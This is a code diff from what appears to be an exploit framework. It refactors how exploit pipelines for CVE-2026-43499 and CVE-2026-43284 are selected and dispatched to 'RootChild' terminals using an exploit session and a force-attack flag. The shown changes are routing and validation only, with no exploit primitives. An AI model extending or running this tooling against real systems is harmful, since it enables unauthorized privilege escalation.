@@ -9,8 +9,10 @@
 #include "backend/cve_2026_43499/backend_profile.hpp"
 #include "backend/cve_2026_43499_backend.hpp"
 #include "session/core_session.hpp"
-#include "terminal/root_child.hpp"
+#include "backend/cve_2026_43499/terminal/root_child.hpp"
 #include "terminal/umh_forward.hpp"
+
+#include <cstdio>
 
 namespace ghostlock::pipeline {
     /* Validate the component selection outside the sensitive window and dispatch
@@ -23,19 +25,12 @@ namespace ghostlock::pipeline {
      * key (its private section); the composition root only routes by backend.
      * An absent/unknown id maps to Unknown, which selection_supported()
      * rejects, preserving the historical fail-closed behaviour. */
+    /* S4 R6b: the step set is no longer a user-selectable id; it is derived
+     * from the resolved combination token (profile/glkv3_parse.cpp). */
     [[nodiscard]] inline contract::StepSetKind wire_stepset(const profile::Document &document) {
-        const uint16_t raw =
-                document.backend ==
-                        static_cast<uint16_t>(contract::BackendKind::Cve2026_43284)
-                        ? ghostlock::backend::steps_from(document)
-                        : ghostlock::backend::cve_2026_43499::backend_profile::steps_from(
-                                  document);
-        switch (raw) {
-            case 1: return contract::StepSetKind::W1W2;
-            case 2: return contract::StepSetKind::W1W3;
-            case 3: return contract::StepSetKind::PageCacheWrite;
-            default: return contract::StepSetKind::Unknown;
-        }
+        const contract::CombinationSpec *spec = contract::combination_spec(
+                static_cast<contract::CombinationKind>(document.combination));
+        return spec != nullptr ? spec->steps : contract::StepSetKind::Unknown;
     }
 
     [[nodiscard]] inline RunResult run_orchestrated_pipeline(
@@ -49,20 +44,31 @@ namespace ghostlock::pipeline {
         if (!contract::selection_supported(selection)) {
             return RunResult{.code = RunCode::Rejected};
         }
+        /* S4 R6b: the token is the composition authority; a planned token
+         * (known but available=false) is rejected here before dispatch. */
+        const contract::CombinationKind combination =
+                static_cast<contract::CombinationKind>(document.combination);
+        if (combination == contract::CombinationKind::Unknown ||
+            !contract::combination_available(combination)) {
+            const std::string_view token = contract::combination_name(combination);
+            (void)std::fprintf(stderr, "unsupported combination token=%.*s\n",
+                               static_cast<int>(token.size()), token.data());
+            return RunResult{.code = RunCode::Rejected};
+        }
         /* PI-window-outside: each Pipeline::run constructs/destroys the selected
          * backend's state through the BackendState RAII guard (ADR-0002 / D3),
          * so the composition root no longer names 43499 or its state. */
-        switch (dispatch_target(selection)) {
+        switch (dispatch_target_of(selection.backend, combination)) {
             case DispatchTarget::Cve43499W1W3_RootChild: {
                 using P = Pipeline<ghostlock::backend::Cve2026_43499Policy,
-                                   ghostlock::terminal::RootChildPolicy>;
+                                   ghostlock::backend::cve_2026_43499::terminal::RootChildPolicy>;
                 static_assert(P::target == DispatchTarget::Cve43499W1W3_RootChild,
                               "dispatch case must match the pipeline's target");
                 return P::run(exploit_session, document, debug_dir, force_attack);
             }
             case DispatchTarget::Cve43499W1W2_RootChild: {
                 using P = Pipeline<ghostlock::backend::Cve43499_W1W2,
-                                   ghostlock::terminal::RootChildPolicy>;
+                                   ghostlock::backend::cve_2026_43499::terminal::RootChildPolicy>;
                 static_assert(P::target == DispatchTarget::Cve43499W1W2_RootChild,
                               "dispatch case must match the pipeline's target");
                 return P::run(exploit_session, document, debug_dir, force_attack);
